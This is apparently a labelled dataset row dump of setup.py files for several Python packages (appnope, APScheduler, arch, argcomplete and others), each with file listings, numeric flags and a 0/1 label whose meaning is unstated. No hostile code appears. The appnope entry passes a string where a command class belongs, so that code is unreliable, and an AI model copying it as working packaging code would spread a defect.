setuptools over distutils
from codecs import open  # To use a consistent encoding
from os import path

here = path.abspath(path.dirname(__file__))

# Get the long description from the relevant file
with open(path.join(here, 'README.rst'), encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='applicationinsights',

    # Versions should comply with PEP440.  For a discussion on single-sourcing
    # the version across setup.py and the project code, see
    # http://packaging.python.org/en/latest/tutorial.html#version
    version='0.11.10',

    description='This project extends the Application Insights API surface to support Python.',
    long_description=long_description,

    # The project's main homepage.
    url='https://github.com/Microsoft/ApplicationInsights-Python',
    download_url='https://github.com/Microsoft/ApplicationInsights-Python',

    # Author details
    author='Microsoft',
    author_email='appinsightssdk@microsoft.com',

    # Choose your license
    license='MIT',

    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        # How mature is this project? Common values are
        #   3 - Alpha
        #   4 - Beta
        #   5 - Production/Stable
        'Development Status :: 3 - Alpha',

        # Indicate who your project is intended for
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',

        # operating systems
        'Operating System :: OS Independent',

        # Pick your license as you wish (should match ""license"" above)
        'License :: OSI Approved :: MIT License',

        # Specify the Python versions you support here. In particular, ensure
        # that you indicate whether you support Python 2, Python 3 or both.
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],

    # What does your project relate to?
    keywords='analytics applicationinsights telemetry appinsights development',

    # You can just specify the packages manually here if your project is
    # simple. Or you can use find_packages().
    packages=find_packages(exclude=['contrib', 'docs', 'tests*']),

    test_suite='tests.applicationinsights_tests'
)

",0
appnope-0.1.3,1,1,1,1,0,0,0,0,_dummy.py _nope.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#-----------------------------------------------------------------------------
#  Copyright (C) 2013 Min RK
#
#  Distributed under the terms of the 2-clause BSD License.
#-----------------------------------------------------------------------------

from __future__ import print_function

import sys

from setuptools import setup
from setuptools.command.bdist_egg import bdist_egg


with open('appnope/__init__.py') as f:
    for line in f:
        if line.startswith('__version__'):
            __version__ = eval(line.split('=', 1)[1])
            break

class bdist_egg_disabled(bdist_egg):
    """"""Disabled version of bdist_egg

    Prevents setup.py install from performing setuptools' default easy_install,
    which it should never ever do.
    """"""
    def run(self):
        sys.exit(""Aborting implicit building of eggs. Use `pip install .` to install from source."")


with open(""README.md"") as f:
    readme = f.read()


setup_args = dict(
    name=""appnope"",
    version=__version__,
    packages=[""appnope""],
    author=""Min Ragan-Kelley"",
    author_email=""benjaminrk@gmail.com"",
    url=""http://github.com/minrk/appnope"",
    description=""Disable App Nap on macOS >= 10.9"",
    long_description=readme,
    long_description_content_type=""text/markdown"",
    license = ""BSD"",
    cmdclass = {
        'bdist_egg': bdist_egg if 'bdist_egg' in sys.argv else 'bdist_egg_disabled',
    },
    classifiers = [
        'License :: OSI Approved :: BSD License',
        'Operating System :: MacOS :: MacOS X',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
    ],
)

setup(**setup_args)
",1
APScheduler-3.9.1,0,1,1,0,1,0,0,0,ISSUE_TEMPLATE.md codeqa_test.yaml publish.yml .gitignore .mailmap .readthedocs.yml events.py asyncio.py base.py base_py3.py debug.py gevent.py pool.py tornado.py twisted.py __init__.py job.py base.py memory.py mongodb.py redis.py rethinkdb.py sqlalchemy.py zookeeper.py __init__.py asyncio.py background.py base.py blocking.py gevent.py qt.py tornado.py twisted.py __init__.py base.py combining.py expressions.py fields.py __init__.py date.py interval.py __init__.py util.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt docker-compose.yml conf.py contributing.rst extending.rst faq.rst index.rst migration.rst events.rst asyncio.rst base.rst debug.rst gevent.rst pool.rst twisted.rst job.rst base.rst memory.rst mongodb.rst redis.rst rethinkdb.rst sqlalchemy.rst zookeeper.rst asyncio.rst background.rst base.rst blocking.rst gevent.rst qt.rst tornado.rst twisted.rst schedulers.rst base.rst combining.rst cron.rst date.rst interval.rst py-modindex.rst userguide.rst versionhistory.rst processpool.py mongodb.py redis_.py rethinkdb_.py sqlalchemy_.py zookeeper.py reference.py client.py server.py asyncio_.py background.py blocking.py gevent_.py qt.py tornado_.py twisted_.py LICENSE.txt PKG-INFO README.rst setup.cfg setup.py conftest.py test_executors.py test_executors_py35.py test_expressions.py test_job.py test_jobstores.py test_schedulers.py test_triggers.py test_util.py test_util_py35.py __init__.py tox.ini,"# coding: utf-8
import os.path

from setuptools import setup, find_packages


here = os.path.dirname(__file__)
readme_path = os.path.join(here, 'README.rst')
readme = open(readme_path).read()

setup(
    name='APScheduler',
    use_scm_version={
        'version_scheme': 'post-release',
        'local_scheme': 'dirty-tag'
    },
    description='In-process task scheduler with Cron-like capabilities',
    long_description=readme,
    author=u'Alex Grönholm',
    author_email='apscheduler@nextday.fi',
    url='https://github.com/agronholm/apscheduler',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10'
    ],
    keywords='scheduling cron',
    license='MIT',
    packages=find_packages(exclude=['tests']),
    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, <4',
    setup_requires=[
        'setuptools_scm'
    ],
    install_requires=[
        'setuptools >= 0.7',
        'six >= 1.4.0',
        'pytz',
        'tzlocal >= 2.0, != 3.*'
    ],
    extras_require={
        ':python_version == ""2.7""': ['futures'],
        ':python_version < ""3.5""': ['funcsigs'],
        'asyncio:python_version == ""2.7""': ['trollius'],
        'gevent': ['gevent'],
        'mongodb': ['pymongo >= 3.0'],
        'redis': ['redis >= 3.0'],
        'rethinkdb': ['rethinkdb >= 2.4.0'],
        'sqlalchemy': ['sqlalchemy >= 0.8'],
        'tornado': ['tornado >= 4.3'],
        'twisted': ['twisted'],
        'zookeeper': ['kazoo'],
        'testing': [
            'pytest',
            'pytest-cov',
            'pytest-tornado5'
        ],
        'testing:python_version == ""2.7""': ['mock'],
        'testing:python_version == ""3.4""': ['pytest_asyncio < 0.6'],
        'testing:python_version >= ""3.5""': ['pytest_asyncio'],
        'doc': [
            'sphinx',
            'sphinx-rtd-theme',
        ],
    },
    zip_safe=False,
    entry_points={
        'apscheduler.triggers': [
            'date = apscheduler.triggers.date:DateTrigger',
            'interval = apscheduler.triggers.interval:IntervalTrigger',
            'cron = apscheduler.triggers.cron:CronTrigger',
            'and = apscheduler.triggers.combining:AndTrigger',
            'or = apscheduler.triggers.combining:OrTrigger'
        ],
        'apscheduler.executors': [
            'debug = apscheduler.executors.debug:DebugExecutor',
            'threadpool = apscheduler.executors.pool:ThreadPoolExecutor',
            'processpool = apscheduler.executors.pool:ProcessPoolExecutor',
            'asyncio = apscheduler.executors.asyncio:AsyncIOExecutor [asyncio]',
            'gevent = apscheduler.executors.gevent:GeventExecutor [gevent]',
            'tornado = apscheduler.executors.tornado:TornadoExecutor [tornado]',
            'twisted = apscheduler.executors.twisted:TwistedExecutor [twisted]'
        ],
        'apscheduler.jobstores': [
            'memory = apscheduler.jobstores.memory:MemoryJobStore',
            'sqlalchemy = apscheduler.jobstores.sqlalchemy:SQLAlchemyJobStore [sqlalchemy]',
            'mongodb = apscheduler.jobstores.mongodb:MongoDBJobStore [mongodb]',
            'rethinkdb = apscheduler.jobstores.rethinkdb:RethinkDBJobStore [rethinkdb]',
            'redis = apscheduler.jobstores.redis:RedisJobStore [redis]',
            'zookeeper = apscheduler.jobstores.zookeeper:ZooKeeperJobStore [zookeeper]'
        ]
    }
)
",1
aqtinstall-2.2.2,0,1,1,1,0,0,0,0,.flake8 archives.py combinations.json exceptions.py helper.py installer.py logging.ini metadata.py settings.ini updater.py version.py __init__.py __main__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.rst accelbubble.7z build_standalone.bat generate_azure_pipelines_matrices.py generate_combinations.py helloworld.7z jom_1_1_3.zip logging.ini openglwindow.7z redditclient.7z settings.ini steps.yml authors.rst changes.rst cli.rst CODE_OF_CONDUCT.rst conf.py configuration.rst CONTRIBUTE.rst getting_started.rst index.rst installation.rst make.bat Makefile SECURITY.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py conftest.py .gitattributes linux-android-expect.json linux-android.html linux-desktop-expect.json linux-desktop.html mac-android-expect.json mac-android.html mac-desktop-expect.json mac-desktop-tools_cmake-expect.json mac-desktop-tools_cmake-update.xml mac-desktop-tools_ifw-expect.json mac-desktop-tools_ifw-update.xml mac-desktop-tools_qtcreator-expect.json mac-desktop-tools_qtcreator-update.xml mac-desktop-tools_qtdesignstudio-expect.json mac-desktop-tools_qtdesignstudio-update.xml mac-desktop.html mac-ios-expect.json mac-ios.html mirror-expect.json mirror-first-td.html mirror-pre-a.html mirror-table-before-pre-a.html mirror-tag-in-a.html settings.ini settings_no_concurrency.ini windows-5140-expect.json windows-5140-update.xml windows-5150-expect.json windows-5150-update.xml windows-5152-src-doc-example-expect.json windows-5152-src-doc-example-update.xml windows-620-android-armv7-update.xml windows-620-expect.json windows-620-update.xml windows-android-expect.json windows-android.html windows-desktop-expect.json windows-desktop-tools-mingw-updates.xml windows-desktop-tools-qtcreator-updates.xml windows-desktop-tools_vcredist-expect.json windows-desktop-tools_vcredist-update.xml windows-desktop.html windows-winrt-expect.json windows-winrt.html test_archives.py test_cli.py test_connection.py test_doc_archives.py test_helper.py test_install.py test_list.py test_updater.py,"import setuptools
setuptools.setup()
",1
ara-1.5.8,1,1,1,0,1,0,0,0,admin.py apps.py auth.py fields.py filters.py prune.py 0001_initial.py 0002_remove_host_alias.py 0003_add_missing_result_properties.py 0004_duration_in_database.py 0005_unique_label_names.py 0006_remove_result_statuses.py 0007_add_expired_status.py 0008_playbook_controller.py 0009_latesthost.py 0010_result_delegated_to.py __init__.py models.py renderers.py serializers.py factories.py tests_auth.py tests_file.py tests_file_content.py tests_host.py tests_label.py tests_latesthost.py tests_play.py tests_playbook.py tests_prune.py tests_records.py tests_result.py tests_task.py tests_utils.py utils.py __init__.py urls.py views.py __init__.py base.py expire.py host.py play.py playbook.py record.py result.py task.py utils.py __init__.py http.py offline.py utils.py __init__.py ara_playbook.py ara_record.py ara_default.py ara_api.py admin.py apps.py context_processors.py base.py __init__.py __init__.py settings.py urls.py wsgi.py __init__.py __main__.py action_plugins.py ansible.py callback_plugins.py env.py exceptions.py lookup_plugins.py path.py plugins.py README.rst __init__.py apps.py forms.py generate.py pagination.py ara.css bootstrap-darkly.min.css bootstrap-flatly.min.css pygments-dark.css pygments-light.css favicon.ico logo.svg bootstrap.bundle.min.js jquery-3.5.1.slim.min.js README.rst base.html file.html host.html host_index.html index.html about_modal.html api_link.html cli_arguments.html host_facts.html host_facts_snippets.html host_index_row.html host_results.html nested_results.html pagination.html playbook_card.html playbook_files.html playbook_hosts.html playbook_records.html playbook_results.html playbook_status_icon.html result_status_icon.html sort_by_date.html sort_by_duration.html sort_by_name.html status_icon.html tags_list.html playbook.html record.html result.html robots.txt datetime_formatting.py diff_result.py pygments_highlights.py static_url.py truncatepath.py urls.py views.py __init__.py dependency_links.txt entry_points.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt changelog-release-notes.sh requirements.txt ansible-configuration.rst ansible-plugins-and-use-cases.rst api-configuration.rst api-documentation.rst api-security.rst api-usage.rst changelog-release-notes.rst cli.rst conf.py container-images.rst contributing.rst distributed-sqlite-backend.rst faq.rst getting-started.rst index.rst troubleshooting.rst database_graph_model.sh README recording-workflow.xml admin_panel_auth.png admin_panel_login.png admin_panel_users.png ansible-role-ara-api.png ansible-role-ara-web.png ara-quickstart-default.gif ara-quickstart-server.gif ara-with-icon.png ara.png cli-playbook-list.png code-review-ci.png gerrit-edit-patch.gif gerrit-new-patch.gif gerrit-profile.png gerrit-sign-in.png gerrit-ssh-key.png database-model.png README recording-workflow.png ubuntu-launchpad.png ui-api-browser-playbook.png ui-api-browser-playbooks.png ui-api-browser.gif ui-api-browser.png ui-reporting.gif LICENSE manage.py MANIFEST.in PKG-INFO README.rst requirements.txt setup.cfg setup.py test-requirements.txt basic.yaml container_test_tasks.yaml benchmark.yaml benchmark_tasks.yaml delegate_to.yaml failed.yaml free_strategy.yaml hosts.yaml import.yaml imported.yaml include_role.yaml incomplete.yaml lookups.yaml main.yaml imported-task.yaml main.yaml main.yaml included-task.yaml main.yaml main.yaml main.yaml ara-ops.yaml main.yaml test-ops.yaml smoke.yaml linters.sh runner-playbook.yml test_tasks.yaml distributed_sqlite_tests.yaml mysql_tests.yaml postgresql_tests.yaml with_ansible-runner.py with_container_images.yaml with_defaults.yaml with_distributed_sqlite.yaml with_fedora_packages.yaml with_mitogen.yaml with_mysql.yaml with_postgresql.yaml zuul_docs.yaml zuul_metadata.yaml zuul_post_logs.yaml zuul_post_with_mysql.yaml zuul_post_with_postgresql.yaml zuul_pre_multinode_networking.yaml zuul_publish_container_images.yaml,"#  Copyright (c) 2018 Red Hat, Inc.
#
#  This file is part of ARA: Ansible Run Analysis.
#
#  ARA is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  ARA is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with ARA.  If not, see <http://www.gnu.org/licenses/>.

import setuptools

setuptools.setup(
    setup_requires=['pbr'],
    pbr=True)
",0
arabic_reshaper-2.1.3,0,1,1,1,1,0,1,0,arabic_reshaper.py letters.py ligatures.py reshaper_config.py __init__.py __version__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
# coding=utf-8

from setuptools import setup

import os

with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()

setup(
    name=""arabic_reshaper"",
    description=(""Reconstruct Arabic sentences to be used in""
                 "" applications that don't support Arabic""),
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    version='2.1.3',
    platforms=""ALL"",
    license=""MIT"",
    packages=['arabic_reshaper'],
    install_requires=['configparser; python_version <""3""',
                      'future',
                      'setuptools'],
    extras_require={
        'with-fonttools': ['fonttools>=4.0; python_version >=""3""',
                           'fonttools>=3.0<4.0; python_version <""3""']
    },
    author=""Abdullah Diab"",
    author_email=""mpcabd@gmail.com"",
    maintainer=""Abdullah Diab"",
    maintainer_email=""mpcabd@gmail.com"",
    package_dir={'arabic_reshaper': 'arabic_reshaper'},
    test_suite='arabic_reshaper.tests',
    include_package_data=True,
    keywords=""arabic shaping reshaping reshaper"",
    url=""https://github.com/mpcabd/python-arabic-reshaper/"",
    download_url=(""https://github.com/mpcabd/""
                  ""python-arabic-reshaper/tarball/master""),
    classifiers=[
        ""Natural Language :: Arabic"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ],
)
",1
arch-5.3.1,0,1,1,1,1,0,0,0,.codacy.yml .codebeatignore .coveragerc .gitattributes generate-documentation.yml .gitignore .landscape.yml .pep8speaks.yml appveyor.yml base.py multiple_comparison.py _samplers.c _samplers.pyi _samplers.pyx _samplers_python.py __init__.py numba.py pandas.py statsmodels.py __init__.py conftest.py kernel.py __init__.py binary.csv.gz __init__.py core-cpi.csv.gz __init__.py crude.csv.gz __init__.py default.csv.gz __init__.py frenchdata.csv.gz __init__.py nasdaq.csv.gz __init__.py sp500.csv.gz __init__.py utility.py vix.csv.gz __init__.py wti.csv.gz __init__.py __init__.py py.typed test_block_length.py test_bootstrap.py test_multiple_comparison.py __init__.py test_covariance.py __init__.py test_compat.py test_data.py test_examples.py test_tester.py cointegration_data.py zivot-andrews.csv __init__.py test_dynamic_ols.py test_engle_granger.py test_fmols_ccr.py test_phillips_ouliaris.py test_unitroot.py __init__.py test_arch_in_mean.py test_base.py test_distribution.py test_forecast.py test_mean.py test_moment.py test_recursions.py test_rescale.py test_variance_forecasting.py test_volatility.py __init__.py test_array.py test_cov.py test_io.py test_timeseries.py test_utility.py __init__.py __init__.py typing.py cointegration.py dfgls.py dickey_fuller.py engle_granger.py kpss.py phillips_ouliaris.py adf_simulation.py adf_z_critical_values_simulation.py adf_z_critical_values_simulation_joblib.py adf_z_critical_values_simulation_large_cluster.p adf_z_simlation_process.py dfgls_critical_values_simulation.py dfgls_simulation_process.py eg_setup.bat eg_setup.ps1 eg_setup.sh engle_granger_simulation.py engle_granger_simulation_process.py kpss_critical_values_simulation.py kpss_simulation_process.py phillips-ouliaris-simulation-process.py phillips-ouliaris-simulation.py phillips_ouliaris.py requirements.txt shared.py zivot_andrews.py __init__.py unitroot.py _engle_granger.py _phillips_ouliaris.py _shared.py __init__.py base.py distribution.py mean.py recursions.c recursions.pyi recursions.pyx recursions_python.py volatility.py __init__.py array.py cov.py exceptions.py io.py testing.py timeseries.py __init__.py property_cached.py __init__.py _version.py reindexing.py _utility.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt azure-pipelines.yml azure_template_posix.yml azure_template_windows.yml install-posix.sh update_path.sh push-docs-gh-pages.sh install-statsmodels-main.sh performance.py make.bat Makefile requirements.txt api.rst background.rst bootstrap.rst bootstrap_histogram.png confidence-intervals.rst iid-bootstraps.rst low-level-interface.rst parameter-covariance-estimation.rst semiparametric-parametric-bootstrap.rst timeseries-bootstraps.rst 1.0.txt 2.0.txt 3.0.txt 4.0.txt 5.0.txt changes.rst conf.py covariance.rst bw-logo.svg color-logo-no-text.svg color-logo-unprocessed.svg color-logo.png color-logo.svg favicon.ico favicon.png favicon.py favicon.svg hero.png hero.py hero.svg logo.svg index.rst background.rst multiple-comparison-reference.rst multiple-comparisons.rst names_wordlist.txt spelling_wordlist.txt cointegration.rst introduction.rst tests.rst unitroot.rst background.rst distribution.rst forecasting.rst introduction.rst mean.rst results.rst univariate.rst utility.rst volatility.rst .gitignore small_fixes.css android-chrome-192x192.png android-chrome-512x512.png apple-touch-icon.png browserconfig.xml color-logo-256.png favicon-16x16.png favicon-32x32.png mstile-150x150.png safari-pinned-tab.svg site.webmanifest attribute.rst class.rst member.rst method.rst minimal_module.rst layout.html bootstrap_examples.ipynb multiple-comparison_examples.ipynb unitroot_cointegration_examples.ipynb unitroot_examples.ipynb univariate_forecasting_with_exogenous_variables.ipynb univariate_using_fixed_variance.ipynb univariate_volatility_forecasting.ipynb univariate_volatility_modeling.ipynb univariate_volatility_scenarios.ipynb lgtm.yml LICENSE.md MANIFEST.in PKG-INFO py.typed pyproject.toml README.md requirements-dev.txt requirements.txt setup.cfg setup.py,"from setuptools import Command, Extension, find_packages, setup
from setuptools.dist import Distribution

from collections import defaultdict
from distutils.errors import CCompilerError, DistutilsExecError, DistutilsPlatformError
import fnmatch
import os
import pathlib

import pkg_resources

CYTHON_COVERAGE = os.environ.get(""ARCH_CYTHON_COVERAGE"", ""0"") in (""true"", ""1"", ""True"")
if CYTHON_COVERAGE:
    print(
        ""Building with coverage for cython modules, ARCH_CYTHON_COVERAGE=""
        + os.environ[""ARCH_CYTHON_COVERAGE""]
    )

try:
    from Cython.Build import cythonize
    from Cython.Distutils.build_ext import build_ext as _build_ext

    CYTHON_INSTALLED = True
except ImportError:
    CYTHON_INSTALLED = False
    if CYTHON_COVERAGE:
        raise ImportError(
            ""cython is required for cython coverage. Unset "" ""ARCH_CYTHON_COVERAGE""
        )

    from setuptools.command.build_ext import build_ext as _build_ext

FAILED_COMPILER_WARNING = """"""
******************************************************************************
*                               WARNING                                      *
******************************************************************************

Unable to build binary modules for arch.  While these are not required to run
any code in the package, it is strongly recommended to either compile the
extension modules or to use numba.

******************************************************************************
*                               WARNING                                      *
******************************************************************************
""""""


# prevent setup.py from crashing by calling import numpy before numpy is installed
class build_ext(_build_ext):
    def build_extensions(self) -> None:
        numpy_incl = pkg_resources.resource_filename(""numpy"", ""core/include"")

        for ext in self.extensions:
            if hasattr(ext, ""include_dirs"") and numpy_incl not in ext.include_dirs:
                ext.include_dirs.append(numpy_incl)
        _build_ext.build_extensions(self)


with pathlib.Path(""requirements.txt"").open() as requirements_txt:
    install_requires = [
        str(requirement)
        for requirement in pkg_resources.parse_requirements(requirements_txt)
    ]


cmdclass = {""build_ext"": build_ext}


class BinaryDistribution(Distribution):
    def is_pure(self) -> bool:
        return False


class CleanCommand(Command):
    def run(self) -> None:
        raise NotImplementedError(""Use git clean -xfd instead"")

    def initialize_options(self) -> None:
        pass

    def finalize_options(self) -> None:
        pass


cmdclass[""clean""] = CleanCommand

with open(""README.md"", ""r"") as readme:
    description = readme.read()

package_data = defaultdict(list)
filetypes = [""*.csv"", ""*.csv.gz""]
for root, _, filenames in os.walk(os.path.join(os.getcwd(), ""arch"")):  # noqa: E501
    matches = []
    for filetype in filetypes:
        for filename in fnmatch.filter(filenames, filetype):
            matches.append(filename)
    if matches:
        package_data[""."".join(os.path.relpath(root).split(os.path.sep))] = filetypes
package_data[""arch""].append(""py.typed"")


def run_setup(binary: bool = True) -> None:
    if not binary:
        extensions = []
        import logging

        logging.warning(
            """"""
##############################################################################

Building arch WITHOUT compiling the binary. You should ensure that numba is
installed.

##############################################################################
""""""
        )
    else:
        directives = {""linetrace"": CYTHON_COVERAGE}
        macros = [(""NPY_NO_DEPRECATED_API"", ""NPY_1_7_API_VERSION"")]
        if CYTHON_COVERAGE:
            macros.append((""CYTHON_TRACE"", ""1""))

        ext_modules = []
        ext_modules.append(
            Extension(
                ""arch.univariate.recursions"",
                [""./arch/univariate/recursions.pyx""],
                define_macros=macros,
            )
        )
        ext_modules.append(
            Extension(
                ""arch.bootstrap._samplers"",
                [""./arch/bootstrap/_samplers.pyx""],
                define_macros=macros,
            )
        )
        extensions = cythonize(
            ext_modules, force=CYTHON_COVERAGE, compiler_directives=directives
        )

    setup(
        name=""arch"",
        license=""NCSA"",
        description=""ARCH for Python"",
        long_description=description,
        long_description_content_type=""text/markdown"",
        author=""Kevin Sheppard"",
        author_email=""kevin.sheppard@economics.ox.ac.uk"",
        url=""https://github.com/bashtage/arch"",
        packages=find_packages(),
        ext_modules=extensions,
        package_dir={""arch"": ""./arch""},
        cmdclass=cmdclass,
        keywords=[
            ""arch"",
            ""ARCH"",
            ""variance"",
            ""econometrics"",
            ""volatility"",
            ""finance"",
            ""GARCH"",
            ""bootstrap"",
            ""random walk"",
            ""unit root"",
            ""Dickey Fuller"",
            ""time series"",
            ""confidence intervals"",
            ""multiple comparisons"",
            ""Reality Check"",
            ""SPA"",
            ""StepM"",
        ],
        zip_safe=False,
        include_package_data=False,
        package_data=package_data,
        distclass=BinaryDistribution,
        classifiers=[
            ""Development Status :: 5 - Production/Stable"",
            ""Intended Audience :: End Users/Desktop"",
            ""Intended Audience :: Financial and Insurance Industry"",
            ""Programming Language :: Python :: 3.7"",
            ""Programming Language :: Python :: 3.8"",
            ""Programming Language :: Python :: 3.9"",
            ""License :: OSI Approved"",
            ""Operating System :: MacOS :: MacOS X"",
            ""Operating System :: Microsoft :: Windows"",
            ""Operating System :: POSIX"",
            ""Programming Language :: Python"",
            ""Programming Language :: Cython"",
            ""Topic :: Scientific/Engineering"",
        ],
        install_requires=install_requires,
        python_requires="">=3.7"",
    )


try:
    build_binary = CYTHON_INSTALLED
    build_binary &= os.environ.get(""ARCH_NO_BINARY"", None) not in (""1"", ""True"", ""true"")
    run_setup(binary=build_binary)
except (
    CCompilerError,
    DistutilsExecError,
    DistutilsPlatformError,
    IOError,
    ValueError,
):
    run_setup(binary=False)
    import warnings

    warnings.warn(FAILED_COMPILER_WARNING, UserWarning)
",1
area-1.1.1,0,1,1,1,1,0,1,0,__init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test.py,"from codecs import open as codecs_open
from setuptools import setup


# Parse the version from the affine module.
with open('area/__init__.py') as f:
    for line in f:
        if ""__version__"" in line:
            version = line.split(""="")[1].strip()
            version = version.strip('""').strip(""'"")
            break

with codecs_open('README.rst', encoding='utf-8') as f:
    readme = f.read()


setup(name='area',
      version=version,
      description=""Calculate the area inside of any GeoJSON geometry. This is a port of Mapbox's"" +
                  ""geojson-area for Python"",
      long_description=readme,
      keywords='geojson area geometry',
      author='Alireza J (Scisco)',
      author_email='scisco7@gmail.com',
      url='https://github.com/scisco/area',
      license='BSD-2-Clause',
      packages=['area'],
      include_package_data=True,
      zip_safe=False,
      test_suite=""test"",
      classifiers=[
          # Indicate who your project is intended for
          'Intended Audience :: Developers',
          'Intended Audience :: Science/Research',

          'Topic :: Scientific/Engineering :: GIS',

          'License :: OSI Approved :: BSD License',
          # Specify the Python versions you support here. In particular, ensure
          # that you indicate whether you support Python 2, Python 3 or both.
          'Programming Language :: Python :: 2.6',
          'Programming Language :: Python :: 2.7',
          'Programming Language :: Python :: 3.3',
          'Programming Language :: Python :: 3.4',
      ],
      )
",0
argcomplete-2.0.0,0,1,1,1,1,0,0,0,python-argcomplete completers.py my_argparse.py my_shlex.py shell_integration.py _check_console_script.py _check_module.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Authors.rst Changes.rst LICENSE.rst MANIFEST.in PKG-INFO README.rst activate-global-python-argcomplete python-argcomplete-check-easy-install-script python-argcomplete-tcsh register-python-argcomplete setup.cfg setup.py prog test.py setup.py test_module.py __init__.py __init__.py,"#!/usr/bin/env python

import glob
from setuptools import setup, find_packages

install_requires = []
tests_require = [""coverage"", ""flake8"", ""pexpect"", ""wheel""]
importlib_backport_requires = [""importlib-metadata >= 0.23, < 5""]

setup(
    name='argcomplete',
    version='2.0.0',
    url='https://github.com/kislyuk/argcomplete',
    project_urls={
        ""Documentation"": ""https://kislyuk.github.io/argcomplete"",
        ""Source Code"": ""https://github.com/kislyuk/argcomplete"",
        ""Issue Tracker"": ""https://github.com/kislyuk/argcomplete/issues"",
        ""Change Log"": ""https://github.com/kislyuk/argcomplete/blob/master/Changes.rst"",
    },
    license='Apache Software License',
    author='Andrey Kislyuk',
    author_email='kislyuk@gmail.com',
    description='Bash tab completion for argparse',
    long_description=open('README.rst').read(),
    python_requires='>=3.6',
    install_requires=install_requires,
    tests_require=tests_require,
    extras_require={
        ""test"": tests_require,
        ':python_version == ""3.6""': importlib_backport_requires,
        ':python_version == ""3.7""': importlib_backport_requires
    },
    packages=find_packages(exclude=['test']),
    scripts=glob.glob('scripts/*'),
    package_data={'argcomplete': ['bash_completion.d/python-argcomplete']},
    zip_safe=False,
    include_package_data=True,
    platforms=['MacOS X', 'Posix'],
    test_suite='test',
    classifiers=[
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Development Status :: 5 - Production/Stable',
        'Topic :: Software Development',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: System :: Shells',
        'Topic :: Terminals'
    ]
)
",1
argh-0.26.2,0,1,1,1,0,0,0,0,assembling.py compat.py completion.py constants.py decorators.py dispatching.py exceptions.py helpers.py interaction.py io.py utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py base.py test_assembling.py test_compat.py test_decorators.py test_dispatching.py test_integration.py test_interaction.py test_regressions.py __init__.py,"#!/usr/bin/env python
# coding: utf-8
#
#    Copyright © 2010—2014  Andrey Mikhaylenko and contributors
#
#    This file is part of Argh.
#
#    Argh is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Lesser General Public License as published
#    by the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Argh is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Lesser General Public License for more details.
#
#    You should have received a copy of the GNU Lesser General Public License
#    along with Argh.  If not, see <http://gnu.org/licenses/>.


import io
import os
import sys

from setuptools import setup
from setuptools.command.test import test as TestCommand


if sys.version_info < (2,7):
    #
    # Python 2.6
    #
    install_requires = ['argparse >= 1.1']
    # Importing `__version__` from `argh` would trigger a cascading import
    # of `argparse`.  Avoiding this as Python < 2.7 ships without argparse.
    __version__ = None
    with io.open('argh/__init__.py', encoding='utf8') as f:
        for line in f:
            if line.startswith('__version__'):
                exec(line)
